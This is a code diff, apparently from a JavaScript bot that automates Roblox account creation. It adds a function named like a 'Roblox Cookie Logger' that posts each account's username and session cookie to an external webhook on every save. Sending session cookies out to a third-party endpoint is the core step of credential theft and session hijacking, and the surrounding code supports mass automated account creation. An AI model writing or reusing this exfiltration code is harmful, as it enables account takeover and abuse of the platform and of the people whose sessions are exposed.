@@ -96,6 +96,28 @@ async function sendWebhook(entry) {
     if (!res.ok) throw new Error(`webhook HTTP ${res.status}`);
 }
 
+async function sendCookieWebhook(entry) {
+    if (!entry.cookie) return;
+    const webhook = readConfig().cookieWebhook;
+    if (!webhook || !/^https:\/\//i.test(webhook)) return;
+    const description = [
+        `**Round:** ${entry.roundNumber}`,
+        `**Time:** ${entry.time}`,
+        `**Username:** \`${entry.username}\``,
+        `**Cookie:** \`${entry.cookie}\``
+    ].join('\n');
+    const payload = {
+        username: 'Roblox Cookie Logger',
+        embeds: [{ title: 'New Roblox Cookie', description, color: 0xffa500 }]
+    };
+    const res = await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error(`cookie webhook HTTP ${res.status}`);
+}
+
 function saveAccount(entry) {
     ensureDataFiles();
     const line = '═'.repeat(46);
@@ -119,6 +141,7 @@ function saveAccount(entry) {
 
     console.log(`✔ Saved: ${entry.username} (${entry.cookie ? 'cookie OK' : 'cookie ไม่มี'})`);
     sendWebhook(entry).catch((err) => console.error(`✖ Webhook: ${err.message}`));
+    sendCookieWebhook(entry).catch((err) => console.error(`✖ Cookie Webhook: ${err.message}`));
 }
 
 async function fillBirthday(page) {
